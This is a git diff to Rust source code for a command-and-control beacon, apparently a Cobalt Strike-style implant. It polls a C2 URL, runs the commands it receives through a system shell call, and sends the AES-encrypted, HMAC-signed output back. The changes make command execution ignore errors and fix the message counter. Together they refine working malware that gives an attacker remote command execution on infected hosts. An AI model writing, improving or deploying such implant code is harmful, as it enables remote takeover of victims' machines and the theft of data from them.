@@ -81,7 +81,7 @@ impl Beacon {
             _ => None,
         }
     }
-    
+
     fn linux_collect_info(&self) -> Result<String> {
         let process_id = std::process::id();
         let ssh_port = 0u16;
@@ -264,7 +264,7 @@ fn main() {
         _ => beacon.linux_collect_info(),
     }
     .unwrap_or_else(|_| panic!("collect info error"));
-
+    let mut counter = 1u32;
     println!("starting connect to {}", C2_GET_URL);
     loop {
         let http_res = Strike::http_get(C2_GET_URL, &cookie, USER_AGENT);
@@ -302,9 +302,9 @@ fn main() {
                     let args = String::from_utf8_lossy(&args);
                     let args = args.replace("/C", "");
                     let args = args.trim();
-                    let output = os_system(&args).unwrap();
+                    let output = os_system_anyway(&args);
                     let iv = b"abcdefghijklmnop";
-                    let counter = 1u32;
+
                     let reply_type = 0u32;
                     let raw_pkg = [
                         &counter.to_be_bytes()[..],
@@ -313,6 +313,7 @@ fn main() {
                         &output.as_bytes(),
                     ]
                     .concat();
+                    counter += 1;
                     let raw_pkg_encrypted =
                         aes_encrypt(&raw_pkg.as_slice(), &beacon.aes_key, iv).unwrap();
                     let hash = hmac_hash(&beacon.hmac_key, raw_pkg_encrypted.as_slice());
